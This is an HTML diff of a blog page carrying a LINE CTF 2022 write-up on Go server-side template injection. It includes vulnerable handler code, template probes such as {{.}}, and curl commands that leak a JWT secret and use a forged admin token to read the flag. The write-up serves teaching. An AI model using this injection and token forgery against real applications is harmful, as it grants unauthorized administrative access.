@@ -15,10 +15,10 @@
 
 
 
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
     <meta name="description" content="0x1 tl;drgotm, a web question in linectf 2022. This is a very good example of golang server side template injection (ssti) 0x2 Vulnerabilitytake a brief a look at the code. In order to get the flag. w">
 <meta property="og:type" content="website">
@@ -27,8 +27,8 @@
 <meta property="og:site_name" content="Aynakeya&#39;s Blog">
 <meta property="og:description" content="0x1 tl;drgotm, a web question in linectf 2022. This is a very good example of golang server side template injection (ssti) 0x2 Vulnerabilitytake a brief a look at the code. In order to get the flag. w">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-03-29T01:47:59.000Z">
-<meta property="article:modified_time" content="2022-03-29T01:47:59.000Z">
+<meta property="article:published_time" content="2022-03-28T10:47:59.000Z">
+<meta property="article:modified_time" content="2022-03-28T10:47:59.000Z">
 <meta property="article:author" content="Aynakeya">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="writeup">
@@ -37,7 +37,6 @@
 
 
 <link rel="canonical" href="http://www.aynakeya.com/ctf-writeup/2022/linectf/line-ctf-2022-web-gotm-ssti">
-
 
 
 <script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":false,"lang":"en","comments":true,"permalink":"http://www.aynakeya.com/ctf-writeup/2022/linectf/line-ctf-2022-web-gotm-ssti.html","path":"ctf-writeup/2022/linectf/line-ctf-2022-web-gotm-ssti.html","title":"[web] gotm (golang ssti) [line ctf 2022]"}</script>
@@ -49,6 +48,27 @@
 
 
 
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/7.2.0/pangu.umd.js" integrity="sha256-JnmRRnJK7DC6RQJbAJb6AXOM9OmWzS6z8eYultk/48Y=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
 
 
 
@@ -108,25 +128,25 @@
 
 
   <div class="search-pop-overlay">
-    <div class="popup search-popup"><div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="Searching..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close" role="button">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div class="search-result-container no-result">
-  <div class="search-result-icon">
-    <i class="fa fa-spinner fa-pulse fa-5x"></i>
-  </div>
-</div>
-
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
     </div>
   </div>
 
@@ -163,7 +183,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives">
-          <span class="site-state-item-count">119</span>
+          <span class="site-state-item-count">120</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -174,7 +194,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags">
-        <span class="site-state-item-count">96</span>
+        <span class="site-state-item-count">98</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -232,20 +252,73 @@
 <p><code>flag_handler</code> require a jwt token with <code>IsAdmin=True</code>. Therefore, in order to forge that, we need to have the secret of jwt token.</p>
 <span id="more"></span>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">func flag_handler(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">    token := r.Header.Get(&quot;X-Token&quot;)</span><br><span class="line">    if token != &quot;&quot; &#123;</span><br><span class="line">        id, is_admin := jwt_decode(token)</span><br><span class="line">        if is_admin == true &#123;</span><br><span class="line">            // write flag</span><br><span class="line">            return</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            w.WriteHeader(http.StatusForbidden)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">func flag_handler(w http.ResponseWriter, r *http.Request) &#123;
+    token :&#x3D; r.Header.Get(&quot;X-Token&quot;)
+    if token !&#x3D; &quot;&quot; &#123;
+        id, is_admin :&#x3D; jwt_decode(token)
+        if is_admin &#x3D;&#x3D; true &#123;
+            &#x2F;&#x2F; write flag
+            return
+        &#125; else &#123;
+            w.WriteHeader(http.StatusForbidden)
+            return
+        &#125;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>Then, the problem become how to get the jwt token from the server. </p>
 <p>In order to get the jwt secret, we need to use a ssti vulnerable in the <code>root_handler</code>. </p>
 <p><code>root_handler</code> first obtain a <code>Account</code> struct from the token and print out the user id using template rendering. </p>
 <p>Since we can control the value in <code>acc.id</code> by register an account. We can inject arbitrary code into the template.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">type Account struct &#123;</span><br><span class="line">    id         string</span><br><span class="line">    pw         string</span><br><span class="line">    is_admin   bool</span><br><span class="line">    secret_key string</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">func root_handler(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">    ...</span><br><span class="line">    acc := get_account(id)</span><br><span class="line">    ...</span><br><span class="line">    tpl, err := template.New(&quot;&quot;).Parse(&quot;Logged in as &quot; + acc.id)</span><br><span class="line">    ...</span><br><span class="line">    return</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">type Account struct &#123;
+    id         string
+    pw         string
+    is_admin   bool
+    secret_key string
+&#125;
+...
+func root_handler(w http.ResponseWriter, r *http.Request) &#123;
+    ...
+    acc :&#x3D; get_account(id)
+    ...
+    tpl, err :&#x3D; template.New(&quot;&quot;).Parse(&quot;Logged in as &quot; + acc.id)
+    ...
+    return
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h1 id="0x3-Some-useful-go-ssti-injection"><a href="#0x3-Some-useful-go-ssti-injection" class="headerlink" title="0x3 Some useful go ssti injection"></a>0x3 Some useful go ssti injection</h1><ol>
 <li><code>&#123;&#123;.&#125;&#125;</code> will print out the whole struct that being passed</li>
 <li><code>&#123;&#123;.PublicField&#125;&#125;</code>  will print out the public field</li>
 <li><code>&#123;&#123;printf "%s" "asdf"&#125;&#125;</code> will do a normal printf thing</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;os&quot;</span><br><span class="line">    &quot;text/template&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type SSTI struct &#123;</span><br><span class="line">    privateMember         string</span><br><span class="line">    PublicMember         string</span><br><span class="line">    value   int</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    ssti := SSTI&#123;</span><br><span class="line">        privateMember : &quot;private&quot;,</span><br><span class="line">        PublicMember : &quot;public&quot;,</span><br><span class="line">        value : 1,</span><br><span class="line">    &#125;</span><br><span class="line">    tpl, _ := template.New(&quot;&quot;).Parse(&quot;Here is &#123;&#123;.&#125;&#125; \n&quot;)</span><br><span class="line">    tpl.Execute(os.Stdout, ssti) // print &quot;Here is &#123;private public 1&#125;&quot;</span><br><span class="line">    tpl, _ = template.New(&quot;&quot;).Parse(&quot;Here is &#123;&#123;.PublicMember&#125;&#125; \n&quot;)</span><br><span class="line">    tpl.Execute(os.Stdout, ssti) // print &quot;Here is public&quot;</span><br><span class="line">    tpl, _ = template.New(&quot;&quot;).Parse(&quot;Here is &#123;&#123;printf \&quot;%s\&quot; \&quot;asdf\&quot;&#125;&#125; \n&quot;)</span><br><span class="line">    tpl.Execute(os.Stdout, ssti) // print &quot;Here is asdf&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">package main
+
+import (
+    &quot;os&quot;
+    &quot;text&#x2F;template&quot;
+)
+
+type SSTI struct &#123;
+    privateMember         string
+    PublicMember         string
+    value   int
+&#125;
+
+func main() &#123;
+    ssti :&#x3D; SSTI&#123;
+        privateMember : &quot;private&quot;,
+        PublicMember : &quot;public&quot;,
+        value : 1,
+    &#125;
+    tpl, _ :&#x3D; template.New(&quot;&quot;).Parse(&quot;Here is &#123;&#123;.&#125;&#125; \n&quot;)
+    tpl.Execute(os.Stdout, ssti) &#x2F;&#x2F; print &quot;Here is &#123;private public 1&#125;&quot;
+    tpl, _ &#x3D; template.New(&quot;&quot;).Parse(&quot;Here is &#123;&#123;.PublicMember&#125;&#125; \n&quot;)
+    tpl.Execute(os.Stdout, ssti) &#x2F;&#x2F; print &quot;Here is public&quot;
+    tpl, _ &#x3D; template.New(&quot;&quot;).Parse(&quot;Here is &#123;&#123;printf \&quot;%s\&quot; \&quot;asdf\&quot;&#125;&#125; \n&quot;)
+    tpl.Execute(os.Stdout, ssti) &#x2F;&#x2F; print &quot;Here is asdf&quot;&quot;
+&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h1 id="0x4-Solution"><a href="#0x4-Solution" class="headerlink" title="0x4 Solution"></a>0x4 Solution</h1><ol>
 <li>register as userid &#x3D;  <code>&#123;&#123;.&#125;&#125;</code> using <code>/regist</code></li>
@@ -254,7 +327,19 @@
 <li>using the jwt secret to forget a jwt token.</li>
 <li>get the flag</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ curl --request GET &#x27;http://34.146.226.125/regist?id=%7B%7B%2E%7D%7D1&amp;pw=asdf&#x27;</span><br><span class="line">&#123;&quot;status&quot;:true,&quot;msg&quot;:&quot;&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ curl --request GET &#x27;http://34.146.226.125/auth?id=%7B%7B%2E%7D%7D&amp;pw=asdf&#x27;</span><br><span class="line">&#123;&quot;status&quot;:true,&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.rthp4OaE1Iau8Q9PIxoB-F9VGukYpbX1I-GpPPDSGhM&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ curl --header &#x27;X-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.rthp4OaE1Iau8Q9PIxoB-F9VGukYpbX1I-GpPPDSGhM&#x27; --request GET &#x27;http://34.146.226.125/&#x27;</span><br><span class="line">Logged in as &#123;&#123;&#123;.&#125;&#125; asdf false fasdf972u1031xu90zm10Av&#125;</span><br><span class="line"></span><br><span class="line">$ curl --header &#x27;X-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTY0ODUyMjgzMn0.nsbn28xiVYZkPPJqAJYv01PEGYuugWBIyriBaB7hcIY&#x27; --request GET &#x27;http://34.146.226.125/flag&#x27;</span><br><span class="line">&#123;&quot;status&quot;:true,&quot;msg&quot;:&quot;Hi &#123;&#123;.&#125;&#125;, flag is LINECTF&#123;country_roads_takes_me_home&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">$ curl --request GET &#39;http:&#x2F;&#x2F;34.146.226.125&#x2F;regist?id&#x3D;%7B%7B%2E%7D%7D1&amp;pw&#x3D;asdf&#39;
+&#123;&quot;status&quot;:true,&quot;msg&quot;:&quot;&quot;&#125;
+
+
+$ curl --request GET &#39;http:&#x2F;&#x2F;34.146.226.125&#x2F;auth?id&#x3D;%7B%7B%2E%7D%7D&amp;pw&#x3D;asdf&#39;
+&#123;&quot;status&quot;:true,&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.rthp4OaE1Iau8Q9PIxoB-F9VGukYpbX1I-GpPPDSGhM&quot;&#125;
+
+
+$ curl --header &#39;X-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.rthp4OaE1Iau8Q9PIxoB-F9VGukYpbX1I-GpPPDSGhM&#39; --request GET &#39;http:&#x2F;&#x2F;34.146.226.125&#x2F;&#39;
+Logged in as &#123;&#123;&#123;.&#125;&#125; asdf false fasdf972u1031xu90zm10Av&#125;
+
+$ curl --header &#39;X-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTY0ODUyMjgzMn0.nsbn28xiVYZkPPJqAJYv01PEGYuugWBIyriBaB7hcIY&#39; --request GET &#39;http:&#x2F;&#x2F;34.146.226.125&#x2F;flag&#39;
+&#123;&quot;status&quot;:true,&quot;msg&quot;:&quot;Hi &#123;&#123;.&#125;&#125;, flag is LINECTF&#123;country_roads_takes_me_home&#125;&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
       </div>
       
       
@@ -279,7 +364,7 @@
 
   <div class="copyright">
     &copy; 
-    <span itemprop="copyrightYear">2024</span>
+    <span itemprop="copyrightYear">2025</span>
     <span class="with-love">
       <i class="fa fa-heart"></i>
     </span>
@@ -306,28 +391,6 @@
 <noscript>
   <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
 </noscript>
-
-
-  
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
-<script src="/js/third-party/search/local-search.js"></script>
-
-
-
-
-
-
-
-  
-
-
-
-
 
 </body>
 </html>
